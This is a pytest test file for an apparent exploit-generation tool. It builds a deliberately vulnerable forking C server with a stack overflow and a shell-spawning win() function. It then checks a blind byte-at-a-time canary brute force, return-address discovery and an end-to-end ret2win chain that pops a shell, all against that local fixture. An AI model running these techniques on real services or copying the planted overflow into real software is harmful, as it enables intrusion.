"""The stack canary brute-forced against a FORKING server -- no information leak at all.

A canary is the one mitigation a forking server makes WEAKER. It is generated once, at the
parent's TLS setup, and every forked child inherits it exactly as every child inherits the
parent's ASLR layout. So the crash-vs-survived oracle BROP uses to read a saved return address
reads the canary a byte at a time: a wrong byte aborts in `__stack_chk_fail` and the handler's
post-return reply never arrives. 7 x 256 connections at worst, because glibc puts a NUL in the low
byte by design and hands one of the eight over for free.

The two traps this module pins down:

* the saved return address's slot cannot be found by probing for "the first word past the canary
  whose corruption crashes the child" -- that finds the saved RBP, which also crashes it. It has
  to be found by READING past the canary and telling the two apart by content.
* a canary cannot be baked into a reproducer, and the SSP message cannot be used as a read oracle
  on any current glibc. Both are asserted here so a regression is loud.
"""
import glob
import os
import shutil
import signal
import subprocess

import pytest
from lykos.analyze.dynamic import sandbox
from lykos.analyze.poc import brop

pytestmark = pytest.mark.skipif(
    sandbox.host_arch() != "x86-64" or not shutil.which("gcc"),
    reason="forking-server fixture + socket detonation are native x86-64 only")

_SYS_LIBC = next(iter(glob.glob("/usr/lib/x86_64-linux-gnu/libc.so.6")
                      + glob.glob("/lib/x86_64-linux-gnu/libc.so.6")), None)

#: A PIE forking server WITH a canary whose handler returns and only then replies -- the reply
#: after the return is what makes the oracle possible.
_SRV = r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
void win(void){ system("/bin/sh"); }
int vuln(int fd){ char b[64]; read(fd,b,512); return 0; }
void handle(int fd){ dup2(fd,0); dup2(fd,1); dup2(fd,2); vuln(fd); write(fd,"OK",2); }
int main(void){
    signal(SIGCHLD, SIG_IGN);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    int one=1; setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&one,sizeof one);
    struct sockaddr_in a; memset(&a,0,sizeof a);
    a.sin_family=AF_INET; a.sin_addr.s_addr=INADDR_ANY; a.sin_port=0;
    if(bind(s,(void*)&a,sizeof a)) return 1;
    listen(s,16);
    for(;;){ int c=accept(s,0,0); if(c<0) continue; if(fork()==0){ close(s); handle(c); _exit(0);} close(c);}
}
"""

#: The same server with NO post-return reply: there is no survival oracle, and the path must
#: decline rather than read every crash as a wrong guess.
_SRV_SILENT = _SRV.replace('vuln(fd); write(fd,"OK",2);', "vuln(fd);")


def _build(tmp_path_factory, name, src, canary=True):
    gcc = shutil.which("gcc") or shutil.which("cc")
    d = tmp_path_factory.mktemp(name)
    (d / "s.c").write_text(src)
    exe = d / "s"
    flags = ["-fstack-protector-all"] if canary else ["-fno-stack-protector"]
    if subprocess.run([gcc, "-fPIE", "-pie", *flags, "-O0", "-w", str(d / "s.c"),
                       "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build the forking-server fixture")
    return exe


class _Server:
    def __init__(self, exe):
        self.proc = brop.spawn_server(str(exe), [])
        self.port = brop.wait_for_port(self.proc, timeout=5) if self.proc else None

    def close(self):
        if self.proc:
            try:
                os.killpg(os.getpgid(self.proc.pid), signal.SIGKILL)
            except Exception:                            # noqa: BLE001
                pass


@pytest.fixture
def canary_server(tmp_path_factory):
    s = _Server(_build(tmp_path_factory, "cbrute", _SRV))
    if not s.port:
        s.close()
        pytest.skip("server never listened")
    yield s
    s.close()


@pytest.fixture
def silent_server(tmp_path_factory):
    s = _Server(_build(tmp_path_factory, "csilent", _SRV_SILENT))
    if not s.port:
        s.close()
        pytest.skip("server never listened")
    yield s
    s.close()


def test_brute_canary_recovers_it_with_no_leak(canary_server):
    """The canary itself, byte at a time over connections. Its low byte must be the NUL glibc puts
    there -- a free self-check that the slot found is really the canary."""
    survives = brop.make_survive_oracle(canary_server.port, token=b"OK", timeout=0.6, tries=3)
    res = brop.brute_canary(survives)
    assert res["ok"], res["reason"]
    assert res["canary"] & 0xFF == 0, f"{res['canary']:#x} has no NUL terminator"
    assert res["first_byte_nul"]
    assert res["offset"] == 72, res["offset"]            # b[64] + 8 bytes of frame padding
    assert "no leak" in res["reason"]


def test_brute_frame_finds_the_return_address_past_the_saved_rbp(canary_server):
    """The trap: the word right above the canary is the saved RBP, and corrupting that crashes the
    child too. The slot is identified by CONTENT -- a main-image code pointer, not a stack
    pointer -- so the answer is the return address's real offset and not the rbp's."""
    survives = brop.make_survive_oracle(canary_server.port, token=b"OK", timeout=0.6, tries=3)
    f = brop.brute_frame(survives, words=4)
    assert f["ok"], f["reason"]
    assert f["canary_offset"] == 72
    assert f["ret_offset"] == 88, f"expected the slot past the saved rbp, got {f['ret_offset']}"
    assert f["ret_offset"] == f["canary_offset"] + 16
    assert brop._IMG_LO <= f["ret_addr"] < brop._IMG_HI
    # the word in between really is a stack pointer, which is why probing would have picked it
    rbp = int.from_bytes(bytes.fromhex(f["saved"])[8:16], "little")
    assert 0x7F0000000000 < rbp < 0x800000000000, hex(rbp)


def test_canary_pad_writes_the_canary_back_at_its_own_slot():
    pad = brop.canary_pad(88, 0x1122334455667700, canary_offset=72)
    assert len(pad) == 88
    assert pad[:72] == b"A" * 72
    assert pad[72:80] == (0x1122334455667700).to_bytes(8, "little")
    assert pad[80:88] == b"B" * 8
    with pytest.raises(ValueError):
        brop.canary_pad(76, 0, canary_offset=72)         # the return address cannot overlap it


def test_candidate_overwrites_rejects_a_pad_of_the_wrong_length():
    with pytest.raises(ValueError):
        list(brop.candidate_overwrites(88, 0x1234, pad=b"A" * 80))
    got = next(iter(brop.candidate_overwrites(88, 0x1234, pad=b"Z" * 88)))
    assert got[0][:88] == b"Z" * 88


def test_the_whole_chain_spawns_a_shell_and_the_canary_is_load_bearing(canary_server):
    """End to end, and the control that makes it mean something: flipping ONE byte of the canary we
    wrote back must spawn no shell, which proves the recovered canary is what let the corrupted
    return address be taken at all."""
    from lykos.analyze.poc import attribution, exploit
    tb = open(canary_server.proc.args[0], "rb").read()
    win_off = exploit.elf_functions(tb)["win"]
    survives = brop.make_survive_oracle(canary_server.port, token=b"OK", timeout=0.6, tries=3)
    f = brop.brute_frame(survives, words=4)
    assert f["ok"], f["reason"]
    pad = brop.canary_pad(f["ret_offset"], f["canary"], canary_offset=f["canary_offset"])
    markers = attribution.make_code_markers()
    oracle = brop.socket_oracle(canary_server.port, markers.command + b"\n", timeout=1.0, gap=0.1)
    # The alignment partner must be endbr64-AWARE, exactly as the real pipeline computes it
    # (exploit_stage _pie_brop_* pass aligns=(0, realign)): a system() call needs a 16-byte-aligned
    # rsp, and the realign entry that skips `push rbp` is win+1 on a plain prologue but win+5 on a
    # CET binary (endbr64 is 4 bytes first). Default gcc emits endbr64, so a hardcoded (0,1) lands
    # mid-endbr64 and the redirect never confirms on a modern host.
    realign = exploit.win_realign_entry(tb, win_off) - win_off
    res = brop.brute_ret2win(oracle, f["ret_offset"], win_off, markers, pad=pad, aligns=(0, realign))
    assert res, "no leak-free redirect to win() through the canary"
    payload, _nbytes, _align = res
    bad = bytearray(payload)
    bad[f["canary_offset"] + 3] ^= 0xFF
    assert not markers.proves(oracle(bytes(bad))), \
        "a flipped canary byte still spawned a shell, so the canary was not load-bearing"


def test_calibrate_survive_token_reads_the_servers_own_reply(canary_server):
    tok = brop.calibrate_survive_token(canary_server.port)
    assert tok == b"OK", tok


def test_a_server_that_never_replies_has_no_survival_oracle(silent_server):
    """Without a post-return response there is nothing to key on, and saying so is the only honest
    answer: every connection would look like a crash and the brute would report the first byte it
    tried."""
    assert brop.calibrate_survive_token(silent_server.port) is None


def test_brute_canary_declines_when_nothing_crashes():
    """A target with no overflow at all: no oracle, and a stated reason rather than a guess."""
    res = brop.brute_canary(lambda payload: True, lo=8, hi=24)
    assert not res["ok"]
    assert "crashed the child" in res["reason"]


def test_brute_frame_rejects_a_word_that_is_not_a_canary():
    """The NUL self-check, driven against an oracle that accepts any byte: the first word read back
    is 0x00000000000000ff-ish junk, and the frame must refuse to call it a canary."""
    res = brop.brute_frame(lambda payload: len(payload) <= 8 or payload[8:9] != b"\x00",
                           offset=8, words=3)
    assert not res["ok"]
    assert "not the NUL terminator" in res["reason"] or "not enough" in res["reason"]


def test_the_ssp_message_no_longer_discloses_argv0():
    """The OTHER canary-era read oracle, and why it is not implemented: overwriting `argv[0]` and
    letting `__stack_chk_fail` print it was removed from glibc. Decided from the libc's own bytes
    by counting the conversions in `__fortify_fail`'s format string -- two meant the program name
    followed the reason, one means it does not."""
    from lykos.analyze.poc import rop
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    v = rop.ssp_leak_feasible(open(_SYS_LIBC, "rb").read())
    assert v["ok"] is False, v
    assert v["conversions"] == 1, v
    assert "terminated" in v["format"]
    assert "dropped" in v["reason"]
    assert rop.ssp_leak_feasible(b"")["ok"] is None     # UNKNOWN, not the historical answer
    # and the shape that WOULD work, so the test proves the counter and not just the constant
    two = rop.ssp_leak_feasible(b"\x00*** %s ***: %s terminated\n\x00")
    assert two["ok"] is True and two["conversions"] == 2
